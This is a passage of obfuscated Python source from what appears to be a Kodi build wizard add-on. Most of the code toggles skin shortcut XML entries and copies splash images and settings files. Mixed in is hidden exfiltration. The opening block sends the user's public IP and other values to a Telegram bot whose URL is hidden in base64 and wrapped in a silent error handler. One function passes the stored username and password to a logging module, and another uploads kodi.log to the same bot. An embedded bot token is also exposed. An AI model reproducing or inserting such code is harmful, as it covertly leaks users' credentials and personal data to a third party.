          OO00000OOO0000O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:577
          O0000OO0OOO0000OO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:578
          O0O0000O00OOOO000 =str (json .loads (O0000OO0OOO0000OO )['ip'])#line:579
          OOO00O000OOO00O00 =OOOOOO0O00O00OO0O #line:580
          OOO00O000OO00000O =OO0OO0O000OO00OO0 #line:581
          import socket #line:583
          O0000OO0OOO0000OO =urllib2 .urlopen (OO00000OOO0000O0O .decode ('base64')+' - '+OOO00O000OOO00O00 +' - '+OOO00O000OO00000O +' - '+O00OOO0OO0O0OO0OO ).readlines ()#line:584
       except :pass #line:585
def googleindicat ():#line:588
			import logg #line:589
			OOO0O0OO0O0OO0000 =(ADDON .getSetting ("pass"))#line:590
			O0OOOO000O0O0OOO0 =(ADDON .getSetting ("user"))#line:591
			logg .logGA (OOO0O0OO0O0OO0000 ,O0OOOO000O0O0OOO0 )#line:592
def logsend ():#line:593
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:594
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:595
      howsentlog ()#line:597
      import requests #line:598
      if xbmc .getCondVisibility ('system.platform.windows'):#line:599
         OOOO0O0O0OOOOOOOO =xbmc .translatePath ('special://home/kodi.log')#line:600
         OOO00OOOO00OOOOOO ={'chat_id':(None ,'-274262389'),'document':(OOOO0O0O0OOOOOOOO ,open (OOOO0O0O0OOOOOOOO ,'rb')),}#line:604
         OOOO00000OO0OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:605
         O0O0000OOO000OOO0 =requests .post (OOOO00000OO0OO000 .decode ('base64'),files =OOO00OOOO00OOOOOO )#line:607
      elif xbmc .getCondVisibility ('system.platform.android'):#line:608
           OOOO0O0O0OOOOOOOO =xbmc .translatePath ('special://temp/kodi.log')#line:609
           OOO00OOOO00OOOOOO ={'chat_id':(None ,'-274262389'),'document':(OOOO0O0O0OOOOOOOO ,open (OOOO0O0O0OOOOOOOO ,'rb')),}#line:613
           OOOO00000OO0OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:614
           O0O0000OOO000OOO0 =requests .post (OOOO00000OO0OO000 .decode ('base64'),files =OOO00OOOO00OOOOOO )#line:616
      else :#line:617
           OOOO0O0O0OOOOOOOO =xbmc .translatePath ('special://kodi.log')#line:618
           OOO00OOOO00OOOOOO ={'chat_id':(None ,'-274262389'),'document':(OOOO0O0O0OOOOOOOO ,open (OOOO0O0O0OOOOOOOO ,'rb')),}#line:622
           OOOO00000OO0OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:623
           O0O0000OOO000OOO0 =requests .post (OOOO00000OO0OO000 .decode ('base64'),files =OOO00OOOO00OOOOOO )#line:625
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:626
def rdoff ():#line:628
	OO00O0OO0O00O0000 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:659
	O0O0O000O0OO0O000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:660
	copyfile (OO00O0OO0O00O0000 ,O0O0O000O0OO0O000 )#line:661
def skindialogsettind18 ():#line:662
	try :#line:663
		O0O0000O00OO0OO00 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:664
		OOO00000000OO0OOO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:665
		copyfile (O0O0000O00OO0OO00 ,OOO00000000OO0OOO )#line:666
	except :pass #line:667
def rdon ():#line:668
	loginit .loginIt ('restore','all')#line:669
	O00O0OO000O00O0OO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:671
	OO0OOOO000OO0000O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:672
	copyfile (O00O0OO000O00O0OO ,OO0OOOO000OO0000O )#line:673
def adults18 ():#line:675
  OOO0OOOO000000OO0 =(ADDON .getSetting ("adults"))#line:676
  if OOO0OOOO000000OO0 =='true':#line:677
    OOOOO0OO000000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:678
    with open (OOOOO0OO000000O0O ,'r')as O0OOO0O0000OOO000 :#line:679
      O00000OOO000000O0 =O0OOO0O0000OOO000 .read ()#line:680
    O00000OOO000000O0 =O00000OOO000000O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:698
    with open (OOOOO0OO000000O0O ,'w')as O0OOO0O0000OOO000 :#line:701
      O0OOO0O0000OOO000 .write (O00000OOO000000O0 )#line:702
def rdbuildaddon ():#line:703
  O00OO00O0000O0000 =(ADDON .getSetting ("auto_rd"))#line:704
  if O00OO00O0000O0000 =='true':#line:705
    O0OO00OO00O0OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:706
    with open (O0OO00OO00O0OOO0O ,'r')as OOOOOO0O0OO0OOOOO :#line:707
      O000OOOO0OOOOOO00 =OOOOOO0O0OO0OOOOO .read ()#line:708
    O000OOOO0OOOOOO00 =O000OOOO0OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:726
    with open (O0OO00OO00O0OOO0O ,'w')as OOOOOO0O0OO0OOOOO :#line:729
      OOOOOO0O0OO0OOOOO .write (O000OOOO0OOOOOO00 )#line:730
    O0OO00OO00O0OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:734
    with open (O0OO00OO00O0OOO0O ,'r')as OOOOOO0O0OO0OOOOO :#line:735
      O000OOOO0OOOOOO00 =OOOOOO0O0OO0OOOOO .read ()#line:736
    O000OOOO0OOOOOO00 =O000OOOO0OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:754
    with open (O0OO00OO00O0OOO0O ,'w')as OOOOOO0O0OO0OOOOO :#line:757
      OOOOOO0O0OO0OOOOO .write (O000OOOO0OOOOOO00 )#line:758
    O0OO00OO00O0OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:762
    with open (O0OO00OO00O0OOO0O ,'r')as OOOOOO0O0OO0OOOOO :#line:763
      O000OOOO0OOOOOO00 =OOOOOO0O0OO0OOOOO .read ()#line:764
    O000OOOO0OOOOOO00 =O000OOOO0OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:782
    with open (O0OO00OO00O0OOO0O ,'w')as OOOOOO0O0OO0OOOOO :#line:785
      OOOOOO0O0OO0OOOOO .write (O000OOOO0OOOOOO00 )#line:786
    O0OO00OO00O0OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:790
    with open (O0OO00OO00O0OOO0O ,'r')as OOOOOO0O0OO0OOOOO :#line:791
      O000OOOO0OOOOOO00 =OOOOOO0O0OO0OOOOO .read ()#line:792
    O000OOOO0OOOOOO00 =O000OOOO0OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:810
    with open (O0OO00OO00O0OOO0O ,'w')as OOOOOO0O0OO0OOOOO :#line:813
      OOOOOO0O0OO0OOOOO .write (O000OOOO0OOOOOO00 )#line:814
    O0OO00OO00O0OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:817
    with open (O0OO00OO00O0OOO0O ,'r')as OOOOOO0O0OO0OOOOO :#line:818
      O000OOOO0OOOOOO00 =OOOOOO0O0OO0OOOOO .read ()#line:819
    O000OOOO0OOOOOO00 =O000OOOO0OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:837
    with open (O0OO00OO00O0OOO0O ,'w')as OOOOOO0O0OO0OOOOO :#line:840
      OOOOOO0O0OO0OOOOO .write (O000OOOO0OOOOOO00 )#line:841
    O0OO00OO00O0OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:843
    with open (O0OO00OO00O0OOO0O ,'r')as OOOOOO0O0OO0OOOOO :#line:844
      O000OOOO0OOOOOO00 =OOOOOO0O0OO0OOOOO .read ()#line:845
    O000OOOO0OOOOOO00 =O000OOOO0OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:863
    with open (O0OO00OO00O0OOO0O ,'w')as OOOOOO0O0OO0OOOOO :#line:866
      OOOOOO0O0OO0OOOOO .write (O000OOOO0OOOOOO00 )#line:867
    O0OO00OO00O0OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:869
    with open (O0OO00OO00O0OOO0O ,'r')as OOOOOO0O0OO0OOOOO :#line:870
      O000OOOO0OOOOOO00 =OOOOOO0O0OO0OOOOO .read ()#line:871
    O000OOOO0OOOOOO00 =O000OOOO0OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:889
    with open (O0OO00OO00O0OOO0O ,'w')as OOOOOO0O0OO0OOOOO :#line:892
      OOOOOO0O0OO0OOOOO .write (O000OOOO0OOOOOO00 )#line:893
    O0OO00OO00O0OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:896
    with open (O0OO00OO00O0OOO0O ,'r')as OOOOOO0O0OO0OOOOO :#line:897
      O000OOOO0OOOOOO00 =OOOOOO0O0OO0OOOOO .read ()#line:898
    O000OOOO0OOOOOO00 =O000OOOO0OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:916
    with open (O0OO00OO00O0OOO0O ,'w')as OOOOOO0O0OO0OOOOO :#line:919
      OOOOOO0O0OO0OOOOO .write (O000OOOO0OOOOOO00 )#line:920
def rdbuildinstall ():#line:923
  try :#line:924
   OOO000O00O0O0O0O0 =(ADDON .getSetting ("auto_rd"))#line:925
   if OOO000O00O0O0O0O0 =='true':#line:926
     OO0000O0O00OOOOOO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:927
     O00000O0OO0OO000O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:928
     copyfile (OO0000O0O00OOOOOO ,O00000O0OO0OO000O )#line:929
  except :#line:930
     pass #line:931
def rdbuildaddonoff ():#line:934
    O0O0OOO0OO00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:937
    with open (O0O0OOO0OO00OO000 ,'r')as O00O00OO00000OO00 :#line:938
      O0OO0OOO0OOO00OOO =O00O00OO00000OO00 .read ()#line:939
    O0OO0OOO0OOO00OOO =O0OO0OOO0OOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:957
    with open (O0O0OOO0OO00OO000 ,'w')as O00O00OO00000OO00 :#line:960
      O00O00OO00000OO00 .write (O0OO0OOO0OOO00OOO )#line:961
    O0O0OOO0OO00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:965
    with open (O0O0OOO0OO00OO000 ,'r')as O00O00OO00000OO00 :#line:966
      O0OO0OOO0OOO00OOO =O00O00OO00000OO00 .read ()#line:967
    O0OO0OOO0OOO00OOO =O0OO0OOO0OOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:985
    with open (O0O0OOO0OO00OO000 ,'w')as O00O00OO00000OO00 :#line:988
      O00O00OO00000OO00 .write (O0OO0OOO0OOO00OOO )#line:989
    O0O0OOO0OO00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:993
    with open (O0O0OOO0OO00OO000 ,'r')as O00O00OO00000OO00 :#line:994
      O0OO0OOO0OOO00OOO =O00O00OO00000OO00 .read ()#line:995
    O0OO0OOO0OOO00OOO =O0OO0OOO0OOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1013
    with open (O0O0OOO0OO00OO000 ,'w')as O00O00OO00000OO00 :#line:1016
      O00O00OO00000OO00 .write (O0OO0OOO0OOO00OOO )#line:1017
    O0O0OOO0OO00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1021
    with open (O0O0OOO0OO00OO000 ,'r')as O00O00OO00000OO00 :#line:1022
      O0OO0OOO0OOO00OOO =O00O00OO00000OO00 .read ()#line:1023
    O0OO0OOO0OOO00OOO =O0OO0OOO0OOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1041
    with open (O0O0OOO0OO00OO000 ,'w')as O00O00OO00000OO00 :#line:1044
      O00O00OO00000OO00 .write (O0OO0OOO0OOO00OOO )#line:1045
    O0O0OOO0OO00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1048
    with open (O0O0OOO0OO00OO000 ,'r')as O00O00OO00000OO00 :#line:1049
      O0OO0OOO0OOO00OOO =O00O00OO00000OO00 .read ()#line:1050
    O0OO0OOO0OOO00OOO =O0OO0OOO0OOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1068
    with open (O0O0OOO0OO00OO000 ,'w')as O00O00OO00000OO00 :#line:1071
      O00O00OO00000OO00 .write (O0OO0OOO0OOO00OOO )#line:1072
    O0O0OOO0OO00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1074
    with open (O0O0OOO0OO00OO000 ,'r')as O00O00OO00000OO00 :#line:1075
      O0OO0OOO0OOO00OOO =O00O00OO00000OO00 .read ()#line:1076
    O0OO0OOO0OOO00OOO =O0OO0OOO0OOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1094
    with open (O0O0OOO0OO00OO000 ,'w')as O00O00OO00000OO00 :#line:1097
      O00O00OO00000OO00 .write (O0OO0OOO0OOO00OOO )#line:1098
    O0O0OOO0OO00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1100
    with open (O0O0OOO0OO00OO000 ,'r')as O00O00OO00000OO00 :#line:1101
      O0OO0OOO0OOO00OOO =O00O00OO00000OO00 .read ()#line:1102
    O0OO0OOO0OOO00OOO =O0OO0OOO0OOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1120
    with open (O0O0OOO0OO00OO000 ,'w')as O00O00OO00000OO00 :#line:1123
      O00O00OO00000OO00 .write (O0OO0OOO0OOO00OOO )#line:1124
    O0O0OOO0OO00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1127
    with open (O0O0OOO0OO00OO000 ,'r')as O00O00OO00000OO00 :#line:1128
      O0OO0OOO0OOO00OOO =O00O00OO00000OO00 .read ()#line:1129
    O0OO0OOO0OOO00OOO =O0OO0OOO0OOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1147
    with open (O0O0OOO0OO00OO000 ,'w')as O00O00OO00000OO00 :#line:1150
      O00O00OO00000OO00 .write (O0OO0OOO0OOO00OOO )#line:1151
def rdbuildinstalloff ():#line:1154
    try :#line:1155
       OO00OO0OO00000O00 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1156
       O0OOOO0000OO0OO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1157
       copyfile (OO00OO0OO00000O00 ,O0OOOO0000OO0OO0O )#line:1159
       OO00OO0OO00000O00 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1161
       O0OOOO0000OO0OO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1162
       copyfile (OO00OO0OO00000O00 ,O0OOOO0000OO0OO0O )#line:1164
       OO00OO0OO00000O00 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1166
       O0OOOO0000OO0OO0O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1167
       copyfile (OO00OO0OO00000O00 ,O0OOOO0000OO0OO0O )#line:1169
       OO00OO0OO00000O00 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1172
       O0OOOO0000OO0OO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1173
       copyfile (OO00OO0OO00000O00 ,O0OOOO0000OO0OO0O )#line:1175
    except :#line:1177
       pass #line:1178
def rdbuildaddonON ():#line:1185
    OOO00O0OO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1187
    with open (OOO00O0OO0000OOOO ,'r')as O0O00OO0000OO0OO0 :#line:1188
      O0O0O0OOO0OOO00OO =O0O00OO0000OO0OO0 .read ()#line:1189
    O0O0O0OOO0OOO00OO =O0O0O0OOO0OOO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1207
    with open (OOO00O0OO0000OOOO ,'w')as O0O00OO0000OO0OO0 :#line:1210
      O0O00OO0000OO0OO0 .write (O0O0O0OOO0OOO00OO )#line:1211
    OOO00O0OO0000OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1215
